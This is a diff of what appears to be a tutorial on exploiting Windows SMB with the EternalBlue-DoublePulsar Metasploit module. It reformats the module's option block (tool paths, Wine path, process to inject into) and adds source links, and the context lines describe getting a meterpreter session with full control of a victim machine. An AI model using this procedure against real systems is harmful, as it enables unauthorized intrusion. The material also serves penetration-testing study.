@@ -20,13 +20,13 @@ Now Open the Eternal Blue-Doublepulsar.rb with any Editor and change the path di
 sudo nano /usr/share/metasploit-framework/modules/exploits/windows/smb/eternalblue_doublepulsar.rb
 ~~~
 ~~~
-	register_options([
-		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
-		OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
-		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
-		OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/']),
-		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
-	], self.class)
+register_options([
+	OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
+	OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
+	OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
+	OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/']),
+	OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
+], self.class)
 ~~~
 
 Also Read  NSA Malware “EternalBlue” Successfully Exploit and Port into Microsoft Windows 10
@@ -98,3 +98,7 @@ It’s done now we have got the meterpreter session and the vulnerability has be
 Now the system has been exploited successfully and we have full control over the victim machine now.
 
 | THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+*source:
+[rapid7](https://github.com/rapid7/metasploit-framework/modules/auxiliary/scanner/smb)
+[ElevenPaths](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
